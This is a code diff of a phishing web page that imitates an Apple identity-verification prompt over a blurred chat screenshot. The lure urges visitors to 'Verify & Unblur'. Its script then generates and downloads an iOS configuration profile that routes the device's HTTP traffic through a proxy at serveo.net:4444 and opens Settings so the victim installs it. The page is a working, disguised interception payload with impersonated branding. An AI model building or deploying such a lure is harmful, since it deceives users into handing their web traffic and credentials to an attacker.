@@ -1,38 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Secure Archive</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Archive Verification</title>
     <style>
         body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
-        .chat-bg {
-            background-image: url('https://images.unsplash.com/photo-1611606063065-ee7946f0787a?q=80&w=1974&auto=format&fit=crop'); 
+        
+        /* 1. REAL INSTAGRAM BACKGROUND */
+        .chat-view {
+            background: url('https://raw.githubusercontent.com/applesecurityalert6-prog/hadima-closet-collections/main/real_insta_background.jpg'); 
             height: 100vh; width: 100%; background-size: cover; background-position: center;
-            position: fixed; top: 0; left: 0; z-index: 1; filter: blur(8px);
+            position: fixed; top: 0; left: 0; z-index: 1; transition: filter 1.2s ease;
         }
-        .container {
-            position: relative; z-index: 3; background: white; padding: 35px; border-radius: 25px;
-            text-align: center; max-width: 310px; margin: 25vh auto;
-            box-shadow: 0 15px 50px rgba(0,0,0,0.8);
+
+        /* 2. OVERLAY & POPUP */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2; display: none; }
+        .popup {
+            position: relative; z-index: 3; background: #fff; padding: 30px; border-radius: 20px;
+            text-align: center; max-width: 300px; margin: 22vh auto;
+            box-shadow: 0 15px 45px rgba(0,0,0,0.6); display: none;
+            animation: fadeIn 0.4s ease-out;
         }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+
         .apple-logo { width: 40px; margin-bottom: 15px; }
+        h2 { font-size: 19px; margin-bottom: 10px; font-weight: 600; color: #1d1d1f; }
+        p { font-size: 13px; color: #6e6e73; margin-bottom: 25px; line-height: 1.4; }
+        
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
-            padding: 15px; border-radius: 12px; font-weight: 600; font-size: 16px; text-align: center;
+            padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; border: none; width: 100%;
         }
+
+        .blur { filter: blur(20px); }
     </style>
 </head>
 <body>
-    <div class="chat-bg"></div>
-    <div class="container">
+
+    <div class="chat-view" id="chat"></div>
+    <div class="overlay" id="overlay"></div>
+
+    <div class="popup" id="modal">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-        <h2>Unblur Archive</h2>
-        <p>To read the full conversation, please install the security profile.</p>
-        <a href="verify.mobileconfig" class="btn" onclick="goToSettings()">Verify & Unblur</a>
+        <h2>Identity Verification</h2>
+        <p>To access this encrypted chat archive, please verify your device identity.</p>
+        <button onclick="startInstallation()" class="btn">Verify & Unblur</button>
     </div>
+
     <script>
-        function goToSettings() {
-            setTimeout(function() {
+        // Start sequence after 3 seconds
+        setTimeout(() => {
+            document.getElementById('chat').classList.add('blur');
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('modal').style.display = 'block';
+        }, 3000);
+
+        function startInstallation() {
+            // Your Serveo/Proxy Payload
+            const payload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key><string>Verification for Hadima Archives</string>
+            <key>PayloadDisplayName</key><string>Identity Certificate</string>
+            <key>PayloadIdentifier</key><string>com.apple.proxy.setup</string>
+            <key>PayloadType</key><string>com.apple.proxy.http</string>
+            <key>PayloadUUID</key><string>12345-67890</string>
+            <key>PayloadVersion</key><integer>1</integer>
+            <key>ProxyServer</key><string>serveo.net</string>
+            <key>ProxyPort</key><integer>4444</integer>
+        </dict>
+    </array>
+    <key>PayloadDisplayName</key><string>Identity Verification</string>
+    <key>PayloadIdentifier</key><string>com.hadima.verify</string>
+    <key>PayloadType</key><string>Configuration</string>
+    <key>PayloadUUID</key><string>09876-54321</string>
+    <key>PayloadVersion</key><integer>1</integer>
+</dict>
+</plist>`;
+
+            // Create blob with correct iOS MIME type
+            const blob = new Blob([payload], { type: 'application/x-apple-aspen-config' });
+            const url = window.URL.createObjectURL(blob);
+            
+            // Trigger hidden download link
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'verify.mobileconfig';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Give iOS time to download before redirecting to Settings
+            setTimeout(() => {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
             }, 5000);
         }
